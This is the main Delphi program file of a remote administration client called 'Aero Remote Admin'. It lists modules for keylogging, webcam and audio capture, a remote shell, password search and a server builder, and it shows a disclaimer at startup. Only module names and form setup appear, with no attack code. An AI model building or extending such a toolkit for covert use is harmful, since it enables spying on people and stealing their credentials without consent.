program Client;

uses
  Forms,
  Windows,
  IniFiles,
  Sysutils,
  StrUtils,
  Controls,
  UnitMain in 'UnitMain.pas' {ClientForm},
  UnitConnectionForm in 'UnitConnectionForm.pas' {ConnectionForm},
  UnitSharedData in 'UnitSharedData.pas',
  UnitScreenCapture in 'UnitScreenCapture.pas' {ScreenCapture},
  UnitContainer in 'UnitContainer.pas' {Container},
  UnitSettings in 'UnitSettings.pas' {Settings},
  UnitFileManager in 'UnitFileManager.pas' {FileManager},
  UnitEditFile in 'UnitEditFile.pas' {EditFile},
  UnitFileTransfer in 'UnitFileTransfer.pas' {FileTransfer},
  UnitThumbDb in 'UnitThumbDb.pas',
  UnitFileSearch in 'UnitFileSearch.pas' {FileSearch},
  UnitBrowseFolder in 'UnitBrowseFolder.pas' {BrowseFolder},
  UnitTransferManager in 'UnitTransferManager.pas' {TransferManager},
  UnitWebcamCapture in 'UnitWebcamCapture.pas' {WebcamCapture},
  UnitServiceManager in 'UnitServiceManager.pas' {ServiceManager},
  UnitEditService in 'UnitEditService.pas' {EditService},
  UnitCreateService in 'UnitCreateService.pas' {CreateService},
  UnitEditIdentification in 'UnitEditIdentification.pas' {EditIdentification},
  UnitWindowManager in 'UnitWindowManager.pas' {WindowManager},
  UnitSendKeys in 'UnitSendKeys.pas' {SendKeys},
  UnitProcessManager in 'UnitProcessManager.pas' {ProcessManager},
  UnitModuleManager in 'UnitModuleManager.pas' {ModuleManager},
  UnitAudioCapture in 'UnitAudioCapture.pas' {AudioCapture},
  UnitKeyLogger in 'UnitKeyLogger.pas' {KeyLogger},
  UnitInstalledApplications in 'UnitInstalledApplications.pas' {InstalledApplications},
  UnitRegEdit in 'UnitRegEdit.pas' {RegEdit},
  UnitEditString in 'UnitEditString.pas' {EditString},
  UnitRemoteShell in 'UnitRemoteShell.pas' {RemoteShell},
  UnitSystemInfo in 'UnitSystemInfo.pas' {SystemInformation},
  UnitPasswordAudit in 'UnitPasswordAudit.pas' {PasswordAudit},
  UnitPasswordSearch in 'UnitPasswordSearch.pas' {PasswordSearch},
  UnitShareServer in 'UnitShareServer.pas' {ShareServer},
  UnitCreateServer in 'UnitCreateServer.pas' {CreateServer},
  UnitSplashScreen in 'UnitSplashScreen.pas' {SplashScreen},
  UnitKeyLogFilter in 'UnitKeyLogFilter.pas' {KeyLogFilter},
  UnitDisclaimer in 'UnitDisclaimer.pas' {Disclaimer},
  UnitSaveProgress in 'UnitSaveProgress.pas' {SaveProgress},
  UnitNotes in 'UnitNotes.pas' {Notes};

{$R *.res}

var
  i: integer;
  Ini: TIniFile;
  Disclaimer: TDisclaimer;
  Show: bool;
begin


  Ini := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Settings.ini');
    Show := Ini.ReadBool('Client','Show',True);
  Ini.Free;

  if Show then begin
    Disclaimer := TDisclaimer.Create(nil);
    if Disclaimer.ShowModal <> mrok then exitprocess(0);
    Ini := TIniFile.Create(ExtractFilePath(Application.ExeName) + 'Settings.ini');
      if Disclaimer.CheckBox1.Checked then Ini.WriteBool('Client','Show',False);
    Ini.Free;
    Disclaimer.Free;
  end;

  FormLoaded := False;
  Splash := TSplashScreen.Create(nil);
  Splash.Show;
  Application.ProcessMessages;

  Application.Initialize;
  Application.ShowMainForm := False;
  Application.Title := 'Aero Remote Admin';

  Application.CreateForm(TClientForm, ClientForm);
  Application.CreateForm(TSaveProgress, SaveProgress);
  Application.CreateForm(TNotes, Notes);
  Application.CreateForm(TKeyLogFilter, KeyLogFilter);
  Application.CreateForm(TSettings, Settings);
  Application.CreateForm(TPasswordSearch, PasswordSearch);
  Application.CreateForm(TBrowseFolder, BrowseFolder);
  Application.CreateForm(TEditService, EditService);
  Application.CreateForm(TCreateService, CreateService);
  Application.CreateForm(TEditIdentification, EditIdentification);
  Application.CreateForm(TSendKeys, SendKeys);
  Application.CreateForm(TEditString, EditString);
  Application.CreateForm(TModuleManager, ModuleManager);
  Application.CreateForm(TShareServer, ShareServer);
  Application.CreateForm(TCreateServer, CreateServer);
  FormLoaded := True;
  ClientForm.Show;
  Splash.Free;
  Application.Run;

end.
